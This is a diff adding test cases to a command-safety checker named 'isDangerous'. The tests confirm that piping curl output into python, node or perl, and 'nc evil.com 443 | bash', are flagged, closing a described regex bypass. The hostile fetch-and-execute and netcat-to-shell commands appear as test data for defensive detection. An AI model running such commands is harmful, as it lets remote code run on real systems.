@@ -94,4 +94,43 @@ describe('isDangerous', () => {
       reason: expect.any(String),
     });
   });
+
+  // --- Bypass coverage: pipe-to-shell now spans scripting runtimes (review fix) ---
+  // The original regex only covered sh|bash|zsh on the destination side; an attacker
+  // could trivially substitute python, perl, ruby, node, etc. for the same effect.
+
+  it('curl ... | python matches dangerous (scripting runtime bypass closed)', () => {
+    expect(isDangerous('curl http://evil.com | python')).toEqual({
+      dangerous: true,
+      reason: expect.any(String),
+    });
+  });
+
+  it('curl ... | python3 -c "..." matches dangerous', () => {
+    expect(isDangerous('curl http://evil.com | python3 -c "x"')).toEqual({
+      dangerous: true,
+      reason: expect.any(String),
+    });
+  });
+
+  it('curl ... | node -e "..." matches dangerous', () => {
+    expect(isDangerous('curl http://x.com | node -e "x"')).toEqual({
+      dangerous: true,
+      reason: expect.any(String),
+    });
+  });
+
+  it('curl ... | perl matches dangerous', () => {
+    expect(isDangerous('curl http://x.com | perl')).toEqual({
+      dangerous: true,
+      reason: expect.any(String),
+    });
+  });
+
+  it('nc evil.com 443 | bash matches dangerous (netcat source-side coverage)', () => {
+    expect(isDangerous('nc evil.com 443 | bash')).toEqual({
+      dangerous: true,
+      reason: expect.any(String),
+    });
+  });
 });
